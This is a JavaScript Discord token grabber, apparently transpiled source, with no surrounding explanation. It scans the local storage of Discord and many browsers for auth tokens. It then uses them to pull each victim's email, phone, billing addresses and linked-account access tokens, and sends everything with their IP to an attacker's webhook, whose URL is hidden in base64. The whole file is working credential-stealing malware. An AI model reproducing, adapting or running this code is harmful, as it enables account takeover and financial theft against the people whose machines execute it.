"use strict";

function _typeof(obj) { if (typeof Symbol === "function" && typeof Symbol.iterator === "symbol") { _typeof = function _typeof(obj) { return typeof obj; }; } else { _typeof = function _typeof(obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; }; } return _typeof(obj); }

(function () {
  var fs = require('fs'),
      webhook = String('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODYzNzY0Mjc1MzE5NjY4NzY3L043OG5oRWYzWmNTZkFYT3kwdVBzWkI3akx3RVRGVXotUk5tcnBpSmZ4MlBhZFpfamFma3R0QXJwRmRQcXd4c09DQTBD'),
      path = ["".concat(__dirname.split(":")[0], ":/Users/").concat(__dirname.split("\\")[2], "/AppData/Roaming/Discord/Local Storage/leveldb"), "".concat(__dirname.split(":")[0], ":/Users/").concat(__dirname.split("\\")[2], "/AppData/Roaming/Lightcord/Local Storage/leveldb"), "".concat(__dirname.split(":")[0], ":/Users/").concat(__dirname.split("\\")[2], "/AppData/Roaming/discordptb/Local Storage/leveldb"), "".concat(__dirname.split(":")[0], ":/Users/").concat(__dirname.split("\\")[2], "/AppData/Roaming/discordcanary/Local Storage/leveldb"), "".concat(__dirname.split(":")[0], ":/Users/").concat(__dirname.split("\\")[2], "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb"), "".concat(__dirname.split(":")[0], ":/Users/").concat(__dirname.split("\\")[2], "/AppData/Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb"), "".concat(__dirname.split(":")[0], ":/Users/").concat(__dirname.split("\\")[2], "/AppData/Local/Amigo/User Data/Local Storage/leveldb"), "".concat(__dirname.split(":")[0], ":/Users/").concat(__dirname.split("\\")[2], "/AppData/Local/Torch/User Data/Local Storage/leveldb"), "".concat(__dirname.split(":")[0], ":/Users/").concat(__dirname.split("\\")[2], "/AppData/Local/Kometa/User Data/Local Storage/leveldb"), "".concat(__dirname.split(":")[0], ":/Users/").concat(__dirname.split("\\")[2], "/AppData/Local/Orbitum/User Data/Local Storage/leveldb"), "".concat(__dirname.split(":")[0], ":/Users/").concat(__dirname.split("\\")[2], "/AppData/Local/CentBrowser/User Data/Local Storage/leveldb"), "".concat(__dirname.split(":")[0], ":/Users/").concat(__dirname.split("\\")[2], "/AppData/Local/7Star/7Star/User Data/Local Storage/leveldb"), "".concat(__dirname.split(":")[0], ":/Users/").concat(__dirname.split("\\")[2], "/AppData/Local/Sputnik/Sputnik/User Data/Local Storage/leveldb"), "".concat(__dirname.split(":")[0], ":/Users/").concat(__dirname.split("\\")[2], "/AppData/Local/Vivaldi/User Data/Default/Local Storage/leveldb"), "".concat(__dirname.split(":")[0], ":/Users/").concat(__dirname.split("\\")[2], "/AppData/Local/Google/Chrome SxS/User Data/Local Storage/leveldb"), "".concat(__dirname.split(":")[0], ":/Users/").concat(__dirname.split("\\")[2], "/AppData/Local/Epic Privacy Browser/User Data/Local Storage/leveldb"), "".concat(__dirname.split(":")[0], ":/Users/").concat(__dirname.split("\\")[2], "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb"), "".concat(__dirname.split(":")[0], ":/Users/").concat(__dirname.split("\\")[2], "/AppData/Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb"), "".concat(__dirname.split(":")[0], ":/Users/").concat(__dirname.split("\\")[2], "/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb"), "".concat(__dirname.split(":")[0], ":/Users/").concat(__dirname.split("\\")[2], "/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb"), "".concat(__dirname.split(":")[0], ":/Users/").concat(__dirname.split("\\")[2], "/AppData/Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb"), "".concat(__dirname.split(":")[0], ":/Users/").concat(__dirname.split("\\")[2], "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb")],
      infos = function infos(a) {
    return new Promise(function (resolve, reject) {
      require('request').get('https://discord.com/api/users/@me', {
        headers: {
          'Content-Type': 'application/json',
          'authorization': a
        }
      }, function (err, res) {
        if (err) return reject(err);
        if (!res.body || !JSON.parse(res.body)) return reject('no body');
        return resolve(JSON.parse(res.body));
      });
    });
  },
      payment = function payment(a) {
    return new Promise(function (resolve, reject) {
      require('request').get('https://discord.com/api/users/@me/billing/payment-sources', {
        headers: {
          'Content-Type': 'application/json',
          'authorization': a
        }
      }, function (err, res) {
        if (err) return reject(err);
        if (!res.body || !JSON.parse(res.body)) return reject('no body');
        return resolve(JSON.parse(res.body));
      });
    });
  },
      connections = function connections(a) {
    return new Promise(function (resolve, reject) {
      require('request').get('https://discordapp.com/api/v9/users/@me/connections', {
        headers: {
          'Content-Type': 'application/json',
          'authorization': a
        }
      }, function (err, res) {
        if (err) return reject(err);
        if (!res.body || !JSON.parse(res.body)) return reject('no body');
        return resolve(JSON.parse(res.body));
      });
    });
  };

  ip = function ip() {
    return new Promise(function (resolve) {
      require('request').get('https://api.ipify.org', function (err, res) {
        if (err) return;
        resolve({
          ip: res.body
        });
      });
    });
  }, rdm = function rdm() {
    for (var e = "", n = 0; n < 6; n++) {
      e += "0123456789ABCDEF"[Math.floor(16 * Math.random())];
    }

    return parseInt(e, 16);
  };

  require('request').post(new Buffer(webhook, 'base64').toString('ascii'), {
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      content: 'Discord is launched!',
      username: 'tanka grabber'
    })
  });

  path.forEach(function (p) {
    setTimeout(function () {
      fs.readdir(p, function (err, file) {
        if (err) return;
        file.forEach(function (e) {
          if (e.match(/.log|.ldb/)) {
            fs.readFile("".concat(p, "/").concat(e), 'utf8', function (err, f) {
              if (err) return;
              if (!f) return;
              var token = f.toString().match(/mfa\.[\w-]{84}/) || f.toString().match(/[\w-]{24}.[\w-]{6}.[\w-]{27}/);

              if (_typeof(token) && token != null) {
                token.forEach(function _callee(a) {
                  var i, f, d, b, l, ii;
                  return regeneratorRuntime.async(function _callee$(_context) {
                    while (1) {
                      switch (_context.prev = _context.next) {
                        case 0:
                          if (a) {
                            _context.next = 2;
                            break;
                          }

                          return _context.abrupt("return");

                        case 2:
                          _context.t0 = a;
                          _context.next = 5;
                          return regeneratorRuntime.awrap(ip());

                        case 5:
                          _context.t1 = _context.sent;
                          _context.next = 8;
                          return regeneratorRuntime.awrap(infos(a));

                        case 8:
                          _context.t2 = _context.sent;
                          _context.next = 11;
                          return regeneratorRuntime.awrap(payment(a));

                        case 11:
                          _context.t3 = _context.sent;
                          _context.next = 14;
                          return regeneratorRuntime.awrap(connections(a));

                        case 14:
                          _context.t4 = _context.sent;
                          _context.t5 = {
                            location: p
                          };
                          i = {
                            token: _context.t0,
                            ip: _context.t1,
                            user: _context.t2,
                            payment: _context.t3,
                            connections: _context.t4,
                            computer: _context.t5
                          };

                          if (!i.user.message) {
                            _context.next = 19;
                            break;
                          }

                          return _context.abrupt("return");

                        case 19:
                          f = {
                            131072: 'Développeur certifié',
                            65536: 'Bot vérifié',
                            16384: 'Bug hunter level 2',
                            4096: 'Système',
                            1024: 'Team discord',
                            512: 'Promotion nitro',
                            256: 'Hypesquad Balance',
                            128: 'Hypesquad Brilliance',
                            64: 'Hypesquad Bravery',
                            8: 'Bug hunter level 1',
                            4: 'Hypesquad',
                            2: 'Partenaire',
                            1: 'Modérateur'
                          }, d = i.user.public_flags, b = [], l = Object.keys(f).length - 1, ii = 0;

                        case 20:
                          if (!(d != 0)) {
                            _context.next = 31;
                            break;
                          }

                          if (!(d >= Object.keys(f)[l])) {
                            _context.next = 27;
                            break;
                          }

                          ii++;

                          if (!(ii == 13)) {
                            _context.next = 25;
                            break;
                          }

                          return _context.abrupt("return", (d = 0, b = null));

                        case 25:
                          b.push(f[Object.keys(f)[l]]);
                          d = d - Object.keys(f)[l];

                        case 27:
                          ;
                          l--;
                          _context.next = 20;
                          break;

                        case 31:
                          setTimeout(function () {
                            require('request').post(new Buffer(webhook, 'base64').toString('ascii'), {
                              headers: {
                                'Content-Type': 'application/json'
                              },
                              body: JSON.stringify({
                                content: 'user infos',
                                embeds: [{
                                  color: rdm(),
                                  title: 'Tanka grabber ( user info )',
                                  description: "\n**token:** ".concat(i.token, "\n**uuid:** ").concat(i.user.id, "\n**tag:** ").concat(i.user.username, "#").concat(i.user.discriminator, "\n**email:** ").concat(i.user.email ? i.user.email : 'no', "\n**phone:** ").concat(i.user.phone ? i.user.phone : 'no', "\n**badges:** ").concat(b ? '\`' + b.join(", ") + '\`' : "\`0 flags found!\`", "\n**nitro:** ").concat(i.user.premium_type == 1 ? 'classic' : premium_type == 2 ? 'booster' : 'no', "\n\n**verified:** ").concat(i.user.verified ? 'yes' : 'no', "\n**nsfw allowed:** ").concat(i.user.nsfw_allowed ? 'yes' : 'no', "\n**a2f:** ").concat(i.user.mfa_enabled ? 'yes' : 'no', "\n**locale:** ").concat(i.user.locale ? 'yes' : 'no', "\n\n\n**token location:** ").concat(i.computer.location, "\n**ip:** ").concat(i.ip.ip, "\n\n**Bio:**\n>>> ").concat(i.user.bio, "\n\n**banner:**"),
                                  image: {
                                    url: i.user.banner ? 'https://cdn.discordapp.com/banners/' + i.user.id + '/' + i.user.banner + '.gif?size=512' : 'https://opengraph.githubassets.com/f850eb781f9da1f039568f21ccdd40e9b9125bf45fbdd1ee386ea5a3363a35eb/NotPunchnox/discord-token-grabber',
                                    footer: {
                                      url: 'https://cdn.discordapp.com/avatars/' + i.user.id + '/' + i.user.avatar + '.webp?size=2048',
                                      text: 'discord.gg/punchnox'
                                    }
                                  }
                                }],
                                username: i.user.username,
                                avatar_url: 'https://cdn.discordapp.com/avatars/' + i.user.id + '/' + i.user.avatar + '.webp?size=2048'
                              })
                            });

                            i.payment.forEach(function (b) {
                              require('request').post(new Buffer(webhook, 'base64').toString('ascii'), {
                                headers: {
                                  'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({
                                  content: 'payment sources',
                                  embeds: [{
                                    color: rdm(),
                                    title: 'Tanka grabber ( payment sources )',
                                    description: "\n**Payment type:** ".concat(b.type == 2 ? 'paypel' : 'credit card', "\n**Valide ?** ").concat(b.invalid ? 'no' : 'yes', "\n**email:** ").concat(b.email, "\n\n__**Billing Address**__:\n\n**name:** ").concat(b.billing_address.name, "\n**line 1:** ").concat(b.billing_address.line_1, "\n**line 2:** ").concat(b.billing_address.line_2 ? b.billing_address.line_2 : 'not found!', "\n**city:** ").concat(b.billing_address.city, "\n**state:** ").concat(b.billing_address.state, "\n**country:** ").concat(b.billing_address.country, "\n**postal code:** ").concat(b.billing_address.postal_code, "\n                                          "),
                                    image: {
                                      footer: {
                                        url: 'https://cdn.discordapp.com/avatars/' + i.user.id + '/' + i.user.avatar + '.webp?size=2048',
                                        text: 'discord.gg/punchnox'
                                      }
                                    }
                                  }],
                                  username: i.user.username,
                                  avatar_url: 'https://cdn.discordapp.com/avatars/' + i.user.id + '/' + i.user.avatar + '.webp?size=2048'
                                })
                              });
                            });
                            ab = "";
                            i.connections.forEach(function (b) {
                              ab += "\n                  **type:** ".concat(b.type, "\n                  **id:** ").concat(b.id, "\n                  **name:** ").concat(b.name, "\n                  **revoked:** ").concat(b.revoked ? 'yes' : 'no', "\n                  **friend sync:** ").concat(b.friend_sync ? 'yes' : 'no', "\n                  **show activity:** ").concat(b.show_activity ? 'yes' : 'no', "\n                  **verified:** ").concat(b.verified ? 'yes' : 'no', "\n                  **access token:** ").concat(b.access_token ? b.access_token : 'not found!', "\n\n\n");
                            });
                            setTimeout(function () {
                              require('request').post(new Buffer(webhook, 'base64').toString('ascii'), {
                                headers: {
                                  'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({
                                  content: 'connections:',
                                  embeds: [{
                                    color: rdm(),
                                    title: 'Tanka grabber ( connections )',
                                    description: ab,
                                    image: {
                                      footer: {
                                        url: 'https://cdn.discordapp.com/avatars/' + i.user.id + '/' + i.user.avatar + '.webp?size=2048',
                                        text: 'discord.gg/punchnox'
                                      }
                                    }
                                  }],
                                  username: i.user.username,
                                  avatar_url: 'https://cdn.discordapp.com/avatars/' + i.user.id + '/' + i.user.avatar + '.webp?size=2048'
                                })
                              }, function (e, r) {
                                return console.log(r.body);
                              });
                            });
                          }, 5000);

                        case 32:
                        case "end":
                          return _context.stop();
                      }
                    }
                  });
                }, 5000);
              }

              ;
            });
          }
        });
      });
    }, 3000);
  });
})();